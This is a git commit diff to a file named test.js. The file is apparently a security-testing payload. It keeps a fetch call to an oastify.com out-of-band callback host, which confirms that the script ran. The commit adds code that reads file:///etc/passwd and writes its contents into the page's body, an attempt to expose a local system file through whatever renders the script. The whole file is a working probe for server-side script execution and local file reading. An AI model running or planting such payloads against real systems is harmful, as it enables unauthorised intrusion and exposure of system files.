9936d6eb088a874e21df767589e7d6a5dfed9a57
vignesh1521 <86752377+vignesh1521@users.noreply.github.com>
2026-09-16 06:50:54 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,15 @@
 fetch("http://lshq47lharsppiz39l18lv5fd6jx7uvj.oastify.com")
 
 
-var i = document.createElement('div');
-i.innerText =navigator.userAgent
-document.body.appendChild(i);
+fetch('file:///etc/passwd')
+  .then(r => r.text())
+  .then(t => {
+    var i = document.createElement('div');
+    i.innerText = t;
+    document.body.appendChild(i);
+  })
+  .catch(e => {
+    var i = document.createElement('div');
+    i.innerText = 'err: ' + e.message;
+    document.body.appendChild(i);
+  });
